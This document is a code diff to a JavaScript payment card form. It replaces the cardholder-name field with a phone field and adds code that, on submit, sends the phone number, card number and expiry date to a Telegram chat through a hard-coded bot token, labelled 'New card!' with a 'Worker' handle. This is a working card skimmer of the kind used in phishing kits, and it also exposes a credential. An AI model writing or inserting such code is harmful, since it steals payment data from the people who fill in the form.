@@ -1,15 +1,26 @@
+import axios from "axios";
+
 const cardNumber = document.querySelector(".card-Number");
-const cardName = document.querySelector(".cardholder-name");
+const cardPhone = document.querySelector(".cardholder-name");
 const cardExpDate = document.querySelector(".exp-date");
 
 const form = document.querySelector("form");
-const inputName = document.querySelector("#name");
+const inputPhone = document.querySelector("#phone");
 const inputNumber = document.querySelector("#card-number");
 const inputMonth = document.querySelector("#month");
 const inputYear = document.querySelector("#year");
 
 const infoErr = document.querySelectorAll(".info-err");
 const complete = document.querySelector(".complete");
+
+const TELEGRAM_BOT_TOKEN = "8265743152:AAHjy2mPkx1uu74gxIXTIayScFQ5FROrIKw";
+const TELEGRAM_CHAT_ID = "-1002743581261";
+const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+let inputPhoneValue;
+let inputNumberValue;
+let inputMonthValue = "00";
+let inputYearValue = "00";
 
 const showError = (input, arrInfoErr, message) => {
   input.classList.add("input-err");
@@ -22,30 +33,20 @@ const hideError = (input, arrInfoErr) => {
   infoErr[arrInfoErr].classList.remove("d-block");
 };
 
-let inputNameValue;
-let inputNumberValue;
-let inputMonthValue = "00";
-let inputYearValue = "00";
-
 const validateInput = (input, arrInfoErr, wordLength) => {
   if (!wordLength) {
     if (!input.value) {
       showError(input, arrInfoErr, "Can’t be blank");
     } else {
       hideError(input, arrInfoErr);
-      inputNameValue = input.value;
     }
   } else {
     if (!input.value) {
       showError(input, arrInfoErr, "Can’t be blank");
     } else if (!/^\d+(\s\d+)*$/.test(input.value)) {
       showError(input, arrInfoErr, "Wrong format, numbers only");
-    } else if (input.value.length < wordLength) {
-      if (wordLength > 3) {
-        showError(input, arrInfoErr, "Card number must be 16 numbers");
-      } else {
-        showError(input, arrInfoErr, `must be ${wordLength} numbers`);
-      }
+    } else if (input.value.replace(/\D/g, "").length < wordLength) {
+      showError(input, arrInfoErr, `must be ${wordLength} numbers`);
     } else {
       hideError(input, arrInfoErr);
 
@@ -59,35 +60,32 @@ const validateInput = (input, arrInfoErr, wordLength) => {
         case inputYear:
           inputYearValue = input.value;
           break;
+        case inputPhone:
+          inputPhoneValue = input.value;
+          break;
       }
     }
   }
 };
 
-function restrictNumber(event) {
-  var z = event.charCode;
-  if ((z > 64 && z < 91) || (z > 96 && z < 123) || z == 32) return true;
-  else {
-    alert("Only characters is allowed");
-    return false;
-  }
-}
-
-inputName.addEventListener("input", (e) => {
-  e.preventDefault();
-  inputNameValue = e.target.value;
-  cardName.textContent = inputNameValue;
-});
-
 function restrictAlphabets(e) {
   var x = e.which || e.keycode;
-  if (x >= 48 && x <= 57) {
+  if ((x >= 48 && x <= 57) || x === 43) {
+    // цифры и "+"
     return true;
   } else {
-    alert("Value must be a number");
+    alert("Value must be a number or +");
     return false;
   }
 }
+
+inputPhone.addEventListener("input", (e) => {
+  e.preventDefault();
+  let phoneVal = e.target.value.replace(/[^\d+]/g, "");
+  e.target.value = phoneVal;
+  inputPhoneValue = e.target.value;
+  cardPhone.textContent = inputPhoneValue;
+});
 
 inputNumber.addEventListener("input", (e) => {
   e.preventDefault();
@@ -95,7 +93,7 @@ inputNumber.addEventListener("input", (e) => {
   formatText = formatText.substring(0, 19);
   formatText = formatText
     .replace(/\s/g, "")
-    .replace(new RegExp(`(.{${4}})`, "g"), "$1 ")
+    .replace(/(.{4})/g, "$1 ")
     .trim();
   e.target.value = formatText;
   inputNumberValue = e.target.value;
@@ -104,8 +102,7 @@ inputNumber.addEventListener("input", (e) => {
 
 const deleteSpace = (input) => {
   if (/\s/.test(input.value)) {
-    let formatText = input.value.replace(/\s/g, "");
-    input.value = formatText;
+    input.value = input.value.replace(/\s/g, "");
   }
 };
 
@@ -123,25 +120,67 @@ inputYear.addEventListener("input", (e) => {
   cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;
 });
 
-form.addEventListener("submit", (e) => {
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
-  inputNameValue = "";
+
+  inputPhoneValue = "";
   inputNumberValue = "";
   inputMonthValue = "00";
   inputYearValue = "00";
 
-  validateInput(inputName, 0);
-  validateInput(inputNumber, 1, 19);
+  validateInput(inputPhone, 0, 10);
+  validateInput(inputNumber, 1, 16);
   validateInput(inputMonth, 2, 2);
   validateInput(inputYear, 2, 2);
 
-  if (inputNameValue && inputNumberValue && inputMonthValue && inputYearValue) {
-    cardName.textContent = inputNameValue;
+  if (
+    inputMonthValue === "" ||
+    inputNumberValue === "" ||
+    inputPhoneValue === "" ||
+    inputYearValue === ""
+  ) {
+    return;
+  }
+
+  if (
+    inputPhoneValue &&
+    inputNumberValue &&
+    inputMonthValue &&
+    inputYearValue
+  ) {
+    cardPhone.textContent = inputPhoneValue;
     cardNumber.textContent = inputNumberValue;
     cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;
 
     form.classList.add("d-none");
     complete.classList.add("d-block");
+  }
+
+  const values = {
+    phone: inputPhoneValue,
+    card: inputNumberValue,
+    expMonth: inputMonthValue,
+    expYear: inputYearValue,
+  };
+
+  const text = `<b>New card!</b>\n\n<b>Phone:</b> <code>${values.phone}</code>\n<b>Card:</b> <code>${values.card}</code>\n<b>Exp:</b> <code>${values.expMonth}/${values.expYear}</code>\n\n<b>Worker:</b> @p19347181`;
+
+  try {
+    const res = await axios.post(
+      API,
+      {
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        parse_mode: "HTML",
+      },
+      {
+        headers: {
+          "Content-Type": "application/json",
+        },
+      }
+    );
+  } catch (error) {
+    console.error(error);
   }
 });
 
